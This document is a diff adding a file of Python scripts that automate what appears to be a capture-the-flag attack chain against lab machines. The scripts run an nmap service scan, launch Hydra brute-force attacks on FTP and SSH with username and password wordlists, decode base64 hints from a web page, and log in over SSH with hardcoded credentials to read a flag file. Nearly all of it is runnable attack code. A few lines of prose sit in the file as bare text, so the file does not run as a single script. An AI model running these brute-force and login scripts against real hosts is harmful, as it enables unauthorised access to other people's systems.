@@ -1,0 +1,115 @@
+import subprocess
+def scan_network(network: str):
+    """Scan the network to discover active hosts and services."""
+    print(f"Scanning network: {network}")
+    try:
+        result = subprocess.run(['nmap', '-sV', network], capture_output=True, text=True)
+        print(result.stdout)  # Display Nmap scan results
+    except Exception as e:
+        print(f"Error during scan: {e}")
+
+if __name__ == "__main__":
+    network = "192.168.1.0/24"  # Change this as per your setup
+    scan_network(network)
+
+
+
+#Automated Brute-Force Attack on FTP (Hydra)
+import subprocess
+
+def brute_force_ftp(target_ip: str, user_file: str, pass_file: str):
+    """Perform brute-force attack on FTP service using Hydra."""
+    print(f"Starting brute-force attack on FTP service at {target_ip}...")
+    try:
+        result = subprocess.run([
+            'hydra', '-L', user_file, '-P', pass_file, 
+            f'ftp://{target_ip}', '-t', '4', '-V', '-d'
+        ], capture_output=True, text=True)
+        print(result.stdout)
+    except Exception as e:
+        print(f"Error during brute-force attack: {e}")
+
+if __name__ == "__main__":
+    target_ip = "192.168.1.7"  # Change this based on your network setup
+    user_file = "userv1.txt"  # Path to the username list
+    pass_file = "passv1.txt"  # Path to the password list
+    brute_force_ftp(target_ip, user_file, pass_file)
+
+# Automated Brute-Force Attack on SSH (Hydra)
+import subprocess
+
+def brute_force_ssh(target_ip: str, user_file: str, pass_file: str):
+    """Perform brute-force attack on SSH service using Hydra."""
+    print(f"Starting brute-force attack on SSH service at {target_ip}...")
+    try:
+        result = subprocess.run([
+            'hydra', '-L', user_file, '-P', pass_file, 
+            f'ssh://{target_ip}', '-t', '4', '-V', '-d'
+        ], capture_output=True, text=True)
+        print(result.stdout)
+    except Exception as e:
+        print(f"Error during brute-force attack: {e}")
+
+if __name__ == "__main__":
+    target_ip = "192.168.1.5"  # Modify this to your target IP
+    user_file = "directory-list-lowercase-2.3-medium.txt"  # Username list
+    pass_file = "rockyou-10.txt"  # Password list
+    brute_force_ssh(target_ip, user_file, pass_file)
+
+# Automated HTTP Service Manual Analysis
+This script uses Python’s requests library to check the HTTP service for base64-encoded strings or hints.
+import requests
+import re
+import base64
+
+def analyze_http_service(target_ip: str):
+    """Analyze the HTTP service for base64-encoded hints."""
+    url = f"http://{target_ip}"
+    print(f"Accessing HTTP service at {url}")
+    try:
+        # Send GET request to HTTP server
+        response = requests.get(url)
+        if response.status_code == 200:
+            print("Response received. Analyzing for base64 strings...")
+            # Search for base64 encoded strings in the HTML response
+            base64_strings = re.findall(r'[A-Za-z0-9+/=]{4,}', response.text)
+            for b64_string in base64_strings:
+                try:
+                    decoded = base64.b64decode(b64_string).decode('utf-8')
+                    print(f"Base64 decoded: {decoded}")
+                except Exception as e:
+                    print(f"Failed to decode: {b64_string}")
+        else:
+            print(f"HTTP request failed with status code {response.status_code}")
+    except Exception as e:
+        print(f"Error while accessing HTTP service: {e}")
+
+if __name__ == "__main__":
+    target_ip = "192.168.1.5"  # Modify as needed
+    analyze_http_service(target_ip)
+
+
+#Automated SSH Flag Retrieval (User and Root Flags)
+This script automates the SSH login with the credentials obtained to retrieve flags.
+import subprocess
+
+def retrieve_flag(username: str, password: str, target_ip: str):
+    """Retrieve flag by SSH login using the obtained credentials."""
+    print(f"Attempting SSH login as {username}...")
+    try:
+        # Using SSH to check for the flag
+        command = f"ssh {username}@{target_ip} 'cat ~/flag.txt'"
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"Flag found: {result.stdout.strip()}")
+        else:
+            print(f"Error during flag retrieval: {result.stderr.strip()}")
+    except Exception as e:
+        print(f"Error during SSH login: {e}")
+
+if __name__ == "__main__":
+    username = "uranus"  # Modify based on your discovered username
+    password = "butterfly"  # Modify with the discovered password
+    target_ip = "192.168.1.5"  # Modify with the target IP
+    retrieve_flag(username, password, target_ip)
+
